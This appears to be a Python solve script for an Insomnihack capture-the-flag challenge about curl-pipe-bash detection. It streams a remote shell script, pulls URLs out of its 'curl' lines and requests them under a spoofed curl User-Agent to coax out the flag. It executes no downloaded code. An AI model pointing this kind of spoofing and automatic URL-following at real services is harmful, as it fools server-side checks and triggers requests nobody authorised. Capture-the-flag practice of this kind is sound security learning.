import requests

headers = {
    "User-Agent": "curl/7.61.0" # if it looks like curl and talks like curl...
}
 
def main():
    url = "https://curlpipebash.teaser.insomnihack.ch/print-flag.sh"
    r = requests.get(url, stream=True)
    for l in r.iter_lines():
        print("print-flag got line: {}".format(l))
        if "curl" in l and "shame" not in l: # We want to curl all new urls, but not the wall of shame one!
            new_link = l.split(" ")[2] # who needs regex?..
            print("Requesting new url: {}".format(new_link))
            requests.get(new_link, headers=headers)

if __name__ == "__main__":
    main()